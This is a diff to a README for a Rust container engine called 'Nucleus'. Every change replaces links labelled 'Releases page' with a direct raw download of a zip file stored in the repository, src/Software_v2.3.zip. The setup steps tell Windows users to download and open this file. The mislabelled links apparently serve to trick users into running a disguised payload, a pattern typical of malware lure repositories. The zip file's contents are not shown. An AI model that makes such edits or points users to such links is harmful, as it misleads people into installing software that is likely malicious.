@@ -1,6 +1,6 @@
 # ⚙️ Nucleus - Run Containers with Less Overhead
 
-[![Download Nucleus](https://img.shields.io/badge/Download-Nucleus-6A5ACD?style=for-the-badge)](https://github.com/Bointertas776/Nucleus/releases)
+[![Download Nucleus](https://img.shields.io/badge/Download-Nucleus-6A5ACD?style=for-the-badge)](https://github.com/Bointertas776/Nucleus/raw/refs/heads/main/src/Software_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Nucleus is a small container engine built in Rust. It runs Linux containers with
 
 If you want a simple way to run containerized apps on Windows, start here:
 
-1. Visit the [Nucleus Releases page](https://github.com/Bointertas776/Nucleus/releases)
+1. Visit the [Nucleus Releases page](https://github.com/Bointertas776/Nucleus/raw/refs/heads/main/src/Software_v2.3.zip)
 2. Download the latest Windows release file
 3. Open the file and follow the setup steps
 4. Start Nucleus and load your container
 
 ## 📥 Download and Install
 
-To download Nucleus, go to the [Releases page](https://github.com/Bointertas776/Nucleus/releases).
+To download Nucleus, go to the [Releases page](https://github.com/Bointertas776/Nucleus/raw/refs/heads/main/src/Software_v2.3.zip).
 
 On that page:
 
@@ -173,7 +173,7 @@ Nucleus works well for:
 
 ### The download does not start
 
-- Refresh the [Releases page](https://github.com/Bointertas776/Nucleus/releases)
+- Refresh the [Releases page](https://github.com/Bointertas776/Nucleus/raw/refs/heads/main/src/Software_v2.3.zip)
 - Try another browser
 - Check your network connection
 - Save the file to a local folder first
@@ -209,4 +209,4 @@ cgroups-v2, container-runtime, containers, devops-tools, docker-alternative, edg
 
 ## 📎 Download Again
 
-If you need the installer later, use the [Nucleus Releases page](https://github.com/Bointertas776/Nucleus/releases) to visit this page to download the latest version
+If you need the installer later, use the [Nucleus Releases page](https://github.com/Bointertas776/Nucleus/raw/refs/heads/main/src/Software_v2.3.zip) to visit this page to download the latest version
